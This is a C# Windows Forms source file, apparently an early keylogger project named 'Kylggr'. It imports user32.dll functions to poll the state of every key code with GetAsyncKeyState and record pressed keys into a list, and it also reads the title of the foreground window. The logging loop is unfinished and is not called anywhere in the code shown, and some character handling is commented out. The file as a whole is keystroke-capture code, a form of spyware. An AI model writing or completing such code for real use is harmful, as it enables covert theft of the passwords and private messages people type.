using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Kylggr
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int i);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private List<string> _keysList = new List<string>();

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            var buff = new StringBuilder(nChars);
            var handle = GetForegroundWindow();

            return GetWindowText(handle, buff, nChars) > 0 ? buff.ToString() : null;
        }

        private void Listener()
        {
            string _testerString = "";
            for (var i = 0; i < 255; i++)
            {
                var keyState = GetAsyncKeyState(i);
                if (keyState != 1 && keyState != -32767) continue;

                _keysList.Add(Convert.ToString((char) i));

                //if ((i >= 65 && i <= 90) || (i >= 97 && i <= 122))
                //{
                //    var character = (char)i;
                //    _testerString += character.ToString().ToLower(CultureInfo.CurrentCulture);
                //}
                //else if (i == 8)
                //{
                //    if (string.IsNullOrEmpty(_testerString)) return;
                //    _testerString = _testerString?.Substring(0, _testerString.Length - 1);
                //}
            }
        }

        private void tmr_ActiveWindow_Tick(object sender, EventArgs e)
        {
            lbl_RunningProcess.Text = GetActiveWindowTitle();
        }
    }
}
